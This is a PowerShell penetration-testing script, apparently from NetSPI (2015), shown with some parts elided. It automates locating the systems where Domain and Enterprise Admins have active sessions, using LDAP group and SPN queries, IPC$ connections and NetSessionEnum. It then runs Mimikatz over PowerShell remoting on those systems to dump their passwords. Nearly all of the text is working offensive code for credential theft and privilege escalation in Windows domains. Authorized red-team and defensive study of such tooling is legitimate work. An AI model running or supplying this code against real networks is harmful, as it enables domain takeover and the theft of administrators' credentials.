<#
 Author: Scott Sutherland, NetSPI 2015

 Description  
 This script will automatically identify systems domain/enterprise admins
 are logged into and attempt to dump password from those systems.  Identification is done
 by querying for active sessions on file shares/domain controllers and querying SPNs.  This
 can be executed as the current domain user or with alternative credentials from a non-domain
 system.  The primary use case is to run this as a domain user / server admin / workstation
 admin to obtain domain admin privileges during pentests.  
 
 Example as current domain user.
 Get-DomainAdmin
 
 Example using alternative credentials from a non-domain system
 Get-DomainAdmin -DomainController 10.1.1.1 -Username domain\user -Password MyPassword!

 Todo: 
 fix final output table so only one table with the creds / servers is returned to pipeline
 fix final admin check
 clean
 add help
 test more
 add gpp grab
 add ability to automatically test multiple credentials
#>
...
# Function that grabs password via mimikatz and ps remoting
# credits to Benjamin Delpy, matt graeber,Will Schroeder, Joseph Bialek, carlos perez, and scott sutherland
...
'@
                ...
                if ($TblPasswordList.row.count -eq 0){
                    ...
                    $TblPasswordList | select type,domain,username,password,EnterpriseAdmin,DomainAdmin -Unique | Sort-Object username,password,domain
                }                
        }
    }

#fucntion to grab username, and samaccountname
function Get-UserMin
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
    ...
    Process
    {
        ...
        $TblUsers = New-Object System.Data.DataTable 
        $TblUsers.Columns.Add("name") | Out-Null
        $TblUsers.Columns.Add("SamAccountName") | Out-Null
        ...
        $ObjSearcher.FindAll() | ForEach-Object {
             ...
             [string]$UserName = $_.properties.name                          
             [string]$UserName_Sam = $_.properties.samaccountname

                $TblUsers.Rows.Add($UserName,$UserName_Sam) | Out-Null
         }
...
function Get-UserSpn
{
    ...
    Param(
        ...
        HelpMessage="The name of the user to lookup spns for.")]
        [string]$Username
    )
    Begin
    {
    ...
    Process
    {
        ...
        # Create table for SPN
        $TblUserSpns = New-Object System.Data.DataTable 
        $TblUserSpns.Columns.Add("ComputerName") | Out-Null
        $TblUserSpns.Columns.Add("Account") | Out-Null
        $TblUserSpns.Columns.Add("Service") | Out-Null


        # filters and stuff
        #$CompFilter = "(servicePrincipalName=*)"
        $CompFilter = "(&(objectCategory=user)(servicePrincipalName=*)(samaccountname=*$Username*))"
        ...
        $ObjSearcher.FindAll() | ForEach-Object {
             [string]$SpnUser = $_.properties.samaccountname            
             $SpnList = $_.properties.ServicePrincipalName
             
             # Add records to data table
             foreach ($item in $_.properties['ServicePrincipalName'])
             {
                [string]$SpnServer =  $item.split("/")[1].split(":")[0]	
                [string]$SpnService =  $item.split("/")[0]                                                                    
                $TblUserSpns.Rows.Add($SpnServer,$SpnUser,$SpnService) | Out-Null
             }                        
         }
...
function Get-FileServers
{
    ...
    Process
    {
        ...
        # Status user        
        # Write-Output "[*] Grabbing file servers from homeDirectory & ScriptPath user properties via LDAP..."
...
# Get-NetSess -weee gruber
function Get-NetSess {
<#
    ...
    .EXAMPLE
    Return sessions for a single host

    C:\PS> ./netsess.ps1 -server host

    .EXAMPLE
    Return sessions a list of hosts

    C:\PS> ./netsess.ps1 -list hosts.txt
    .EXAMPLE
    Return sessions from domain controllers

    C:\PS> ./netsess.ps1 -currentdomain

    .EXAMPLE
    Return sessions from forest domain controllers

    C:\PS> ./netsess.ps1 -currentforest

    .EXAMPLE
    Return sessions from file servers set in LDAP under user's homedirectories

    C:\PS> ./netsess.ps1 -share

    .EXAMPLE
    Search returned sessions for a specific Domain Group

    C:\PS> ./netsess.ps1 -share -group "Domain Admins"

    .EXAMPLE
    Output in table form

    C:\PS> ./netsess.ps1 -share -group "Domain Admins" | format-table

    .EXAMPLE
    Combine multi switches

    C:\PS> ./netsess.ps1 -server 192.168.1.1 -share -currentdomain -currentforest -list list.txt -group "Domain Admins" | format-table
...
function GetGroupMembers {
    ...
    $group = [System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity($context,$group)

    if ($group -ne $null) {
        $members = $group.GetMembers($true)

        foreach ($member in $members){
            $group_members += $member.SamAccountName
        }
    }
    else {
...
function GetServers {
    ...
    if ($currentforest){
        ...
        $servers += GetCurrentForestControllers

    }
    if($currentdomain){

        $servers += GetCurrentDomainControllers

    }
    if($share){

        $servers += GetFileServers
    }
    if($list){

        $servers += GetCustomList
    }
    if ($server){
        $servers += $server
    }
...
function GetCurrentDomainControllers {
$domain_controllers = @()
$domain = [system.directoryservices.activedirectory.domain]::GetCurrentDomain() |
        ForEach-Object {$_.DomainControllers} | ForEach-Object {
            $domain_controllers += $_.Name}
$domain_controllers
}

function GetCustomDomainControllers {
$domain_controllers = @()
$Forest = [system.directoryservices.activedirectory.Forest]::GetCurrentForest()
$Forest.domains | Where-Object {$_.Name -match $domain} |
            ForEach-Object {$_.DomainControllers} | ForEach-Object {
            $domain_controllers += $_.Name}
$domain_controllers
}
...
$servers = @()
$domain_entry = [system.directoryservices.activedirectory.domain]::GetCurrentDomain().GetDirectoryEntry()
$objSearcher = New-Object DirectoryServices.DirectorySearcher($domain_entry)
$objSearcher.PropertiesToLoad.Add("homeDirectory")
$colResults = $objSearcher.FindAll()
$stuff = @()
foreach ($objResult in $colResults){
    if ($entries = [regex]::match($objResult.Properties.Values -like "\\*",'\\([^\\]+)\\').Groups[1].Value){
        $servers += $entries
    }
}
$servers | select -unique
}
...
function StartEnumeration {
    ...
    for ($i = 0; ($i -lt $TotalEntries); $i++){
        ...
        $username = $Info | Select-Object -ExpandProperty sesi10_username
        ...
        if ($group){
            ...
            if ($status){
                $row = $table.NewRow()
                $row.server = $server
                $row.client = $Info | Select-Object -ExpandProperty sesi10_cname
                $row.username = $username
                $time = $Info | Select-Object -ExpandProperty sesi10_time
                $time = New-TimeSpan -Seconds $time
                $row.time = $time
                $idletime = $Info | Select-Object -ExpandProperty sesi10_idle_time
                $idletime = New-TimeSpan -Seconds $idletime
...
function EnumerateServers {
    ...
    foreach($server in $servers){
        ...
        $Result = [pinvoke.Win32Util]::NetSessionEnum($server,$null,$null,10,[ref]$ptrInfo,-1,[ref]$TotalEntries,[ref]$TotalRead,[ref]$ResumeHandle)

        $Increment = [System.Runtime.Interopservices.Marshal]::SizeOf([System.Type] $type)
        $table = New-Object system.Data.DataTable "table"
        $col1 = New-Object system.Data.DataColumn server,([string])
        $col2 = New-Object system.Data.DataColumn client,([string])
        $col3 = New-Object system.Data.DataColumn username,([string])
        $col4 = New-Object system.Data.DataColumn time,([string])
        $col5 = New-Object system.Data.DataColumn idletime,([string])
        ...
        if ($Result -eq 0){
            StartEnumeration $ptrInfo $TotalEntries $Increment $table $group_members
        }
    $table
    }
}
...
# ---------------------------
# Create data tables for fun
#----------------------------
# List of domain and entrprise admin list
$Table_TargetUsers = New-Object System.Data.DataTable 
$Table_TargetUsers.Columns.Add("Username") | Out-Null

# List of computers to run netsess against
$Table_TargetNetsess = New-Object System.Data.DataTable 
$Table_TargetNetsess.Columns.Add("ComputerName") | Out-Null

# List sessions
$Table_sessions = New-Object System.Data.DataTable 
$Table_sessions.Columns.Add("ComputerName") | Out-Null
$Table_sessions.Columns.Add("username") | Out-Null

# List of computers to run invoke-mimikatz on
$Table_TargetDaSystems = New-Object System.Data.DataTable 
$Table_TargetDaSystems.Columns.Add("ComputerName") | Out-Null
...
Write-Output "Getting list of domain controllers from $TargetDC..."
try {
    if(($DomainController) -and ($Credential)){
        $DomainControllers = Get-DomainController -DomainController $DomainController -Credential $Credential | Select dnshostname
    }else{
        $DomainControllers = Get-DomainController | Select dnshostname
    }

    # Add to netsess target list
    $DomainControllers | % { $Table_TargetNetsess.Rows.Add($_.DnsHostName) | Out-Null }
}catch{
    Write-Host "Host is not accessible or credentials or wrong."
    break
}

# ---------------------------
# Get list of domain and 
# enterprise admins
# --------------------------- 
Write-Output "Getting list of Domain/Enterprise Admins from $TargetDC..."

if(($DomainController) -and ($Credential)){
    $DomainUsers = Get-UserMin -DomainController $DomainController -Credential $Credential
    Get-GroupMember -DomainController $DomainController -Credential $Credential -Group "Domain Admins" | 
    % { 
        $AdminUser = $_.GroupMember
        $DomainUsers |
        %{ 
            $DomainUser_name = $_.name
            $DomainUser_sam = $_.samaccountname
            if ($AdminUser -eq $DomainUser_name){
                $Table_TargetUsers.Rows.Add($DomainUser_sam) | Out-Null 
            }
         }
     }

    Get-GroupMember -DomainController $DomainController -Credential $Credential -Group "Enterprise Admins" | 
    % { 
        $AdminUser = $_.GroupMember
        $DomainUsers |
        %{ 
    ...
    $DomainUsers = Get-UserMin
    Get-GroupMember -Group "Domain Admins" | 
    % { 
        $AdminUser = $_.GroupMember
        $DomainUsers |
        %{ 
...
# ---------------------------
Write-Output "Getting list of file servers from $TargetDC..."
if(($DomainController) -and ($Credential)){
    $FileServers = Get-FileServers -DomainController $DomainController -Credential $Credential -verbose 
}else{
    $FileServers = Get-FileServers -verbose
}

$FileServers | % { $Table_TargetNetsess.Rows.Add($_.ComputerName) | Out-Null }

# ---------------------------
# Create IPC$ connections
# uses provide creds to auth
# to remote systems for sessions
# ---------------------------
Write-Output "Creating IPC$ connections to DCs and File Servers..."
$Table_TargetNetsess |
% {
    $RemoteComputer = $_.computername
    if(($DomainController) -and ($Credential)){
        $MapCmd = "net use \\$RemoteComputer\ipc$ /user:$username '$password'"
    }else{
        $MapCmd = "net use \\$RemoteComputer\ipc$"
    }
    Invoke-Expression -Command $MapCmd |Out-Null
}

# ---------------------------
# Get session lists
# ---------------------------
Write-Output "Grabbing active sessions from domain controllers and file servers..."
$Table_TargetNetsess | 
% {
    Get-Netsess -server $_.computername |
    % { 

        $Table_sessions.Rows.Add($_.server,$_.username) | Out-Null        
    }    
}

# ---------------------------
# Remove IPc Connections
# ---------------------------
Write-Output "Removing IPC$ connections to DCs and File Servers..."
$Table_TargetNetsess |
% {
    $RemoteComputer = $_.computername
    $MapCmd = "net use \\$RemoteComputer\ipc$ /del"
    Invoke-Expression -Command $MapCmd |Out-Null
}

# ---------------------------
# Filter sessions for domain admins
# ---------------------------
Write-Output "Filtering Admins sessions..."
$Table_sessions | select username,computername | 
%{

    $Sess_User = $_.username
    $Sess_Computer = $_.computername
    $Table_TargetUsers | select username -Unique |
    %{
        
        if($_.username -eq $Sess_User){
            #Write-Output "$Sess_User da/ea logged into $Sess_Computer."
            $Table_TargetDaSystems.Rows.Add($Sess_Computer) | Out-Null                          
        }        
    }
}
...
# Get list of DA SPN 
# ---------------------------
Write-Output "Locating admin SPN entries..."
$Table_TargetUsers | select username -Unique |
%{
    $MyAdmin = $_.username
    if(($DomainController) -and ($Credential)){
        Get-UserSpn -DomainController $DomainController -Credential $Credential -Username "$MyAdmin" | select ComputerName| 
        %{
            
            $Table_TargetDaSystems.Rows.Add($_.ComputerName) | Out-Null   
        }
    }else{        
        Get-UserSpn -Username "$MyAdmin" | select ComputerName | 
        %{
...
# ---------------------------
# Run mimikatz on domain 
# on systems with da's 
# logged in
# ---------------------------
$TargetCount = $Table_TargetDaSystems | select computername -Unique | measure | select count -ExpandProperty count
Write-Output "Found $TargetCount systems where admins are logged in."
Write-Output "Attempting to run mimikatz on the remote sytsems using ppsremoting..."

$Table_TargetDaSystems | select computername -Unique |
%{
    $GetDaComputer = $_.ComputerName
    if(($DomainController) -and ($Credential)){
        $X = Invoke-MassMimikatz-PsRemoting –Verbose –hosts “$GetDaComputer” -username $username -password $password –DomainController $DomainController
        $X
    }else{
        Invoke-MassMimikatz-PSRemoting –Verbose –hosts “$GetDaComputer”
    }
}
